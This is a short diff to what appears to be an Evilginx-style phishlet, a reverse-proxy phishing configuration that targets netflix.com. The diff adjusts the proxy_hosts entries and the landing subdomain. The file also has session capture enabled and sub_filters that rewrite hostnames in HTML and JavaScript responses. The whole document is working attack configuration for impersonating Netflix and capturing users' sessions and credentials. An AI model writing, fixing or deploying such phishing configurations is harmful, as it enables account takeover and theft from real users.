@@ -1,8 +1,8 @@
 author: '@longwu'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'netflix.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'netflix.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'netflix.com', session: true, is_landing: false}
 
 sub_filters:
   - {triggers_on: 'netflix.com', orig_sub: '', domain: 'netflix.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
